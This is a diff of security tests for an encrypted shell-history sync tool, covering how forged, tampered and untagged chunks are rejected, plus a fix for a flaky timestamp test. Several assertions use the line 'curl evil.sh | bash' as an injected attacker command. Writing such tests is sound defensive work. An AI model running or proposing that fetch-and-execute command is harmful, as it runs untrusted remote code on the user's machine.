@@ -746,7 +746,7 @@ class TestChunkAuthenticity(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertEqual(report.forged, {f"{alpha.id}/2023-11-14"})
+            self.assertEqual(report.unauthenticated, {f"{alpha.id}/2023-11-14"})
             self.assertEqual(report.chunks_merged, 0)
             self.assertNotIn("curl evil.sh | bash", beta.commands())
 
@@ -777,18 +777,27 @@ class TestChunkAuthenticity(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-            self.assertEqual(report.forged, {"deadbeefdeadbeef/2023-11-14"})
+            self.assertEqual(report.unauthenticated, {"deadbeefdeadbeef/2023-11-14"})
             self.assertNotIn("curl evil.sh | bash", beta.commands())
 
     def test_tampering_with_an_authentic_chunk_is_refused(self) -> None:
         """Flipping bytes in a real chunk must not merely fail to decrypt."""
         alpha, beta = self.enrolled_pair()
         with alpha.active():
+            before = {c.name for c in store.iter_chunks(alpha.id)}
             alpha.record("2023-11-14", 1_700_000_002, "cargo build")
-            sync.run()
+            # An explicit, strictly later timestamp. Two chunks written in the
+            # same wall-clock second share a prefix and differ only by a random
+            # suffix, so the merge watermark -- a plain string compare -- skips
+            # the second one about half the time and it is never examined at
+            # all. That is issue #27's mechanism, and it made this test flake
+            # 40% of runs; pinning the second is what makes it deterministic.
+            sync.run(now=2_000_000_000)
+            fresh = ({c.name for c in store.iter_chunks(alpha.id)} - before).pop()
+            self.assertGreater(fresh, max(before), "the tampered chunk must be past the watermark")
 
         def flip(work: Path) -> None:
-            target = sorted((work / "hosts" / alpha.id / "2023-11-14").glob("*.age"))[-1]
+            target = work / "hosts" / alpha.id / "2023-11-14" / fresh
             blob = bytearray(target.read_bytes())
             blob[-1] ^= 0xFF
             target.write_bytes(bytes(blob))
@@ -796,4 +805,30 @@ class TestChunkAuthenticity(SyncTestCase):
         self.push_as_attacker(flip)
 
         with beta.active():
-            self.assertEqual(sync.run().forged, {f"{alpha.id}/2023-11-14"})
+            self.assertEqual(sync.run().unauthenticated, {f"{alpha.id}/2023-11-14"})
+
+    def test_an_untagged_chunk_is_refused_like_a_wrongly_tagged_one(self) -> None:
+        """ "No tag" and "wrong tag" must reach the same answer.
+
+        Anything else is the downgrade: an attacker would simply omit the tag.
+        """
+        alpha, beta = self.enrolled_pair()
+
+        def legacy(work: Path) -> None:
+            pub = (
+                (work / "hosts" / alpha.id / "keys" / "2023-11-14.pub")
+                .read_text(encoding="utf-8")
+                .strip()
+            )
+            entry = Entry(1_700_000_900, alpha.id, "s1", "~", 0, 5, "old-but-mine")
+            payload = sync.pack((format_line(entry) + "\n").encode("utf-8"))
+            target = work / "hosts" / alpha.id / "2023-11-14" / "9999999999-eeeeee.age"
+            # No frame_chunk: exactly what an older woswoar wrote.
+            target.write_bytes(crypto.encrypt_to(payload, pub))
+
+        self.push_as_attacker(legacy)
+
+        with beta.active():
+            report = sync.run()
+            self.assertEqual(report.unauthenticated, {f"{alpha.id}/2023-11-14"})
+            self.assertNotIn("old-but-mine", beta.commands(), "unverified history was merged")
